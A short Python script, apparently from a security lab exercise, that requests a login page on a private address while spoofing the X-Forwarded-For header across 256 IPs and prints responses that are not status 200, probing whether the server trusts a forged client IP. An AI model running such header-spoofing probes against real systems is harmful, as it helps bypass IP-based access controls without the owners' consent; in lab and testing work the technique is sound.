import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)
    # 실제 나오는 응답 확인
    if 200 != response.status_code:
        print(response.text[:300])
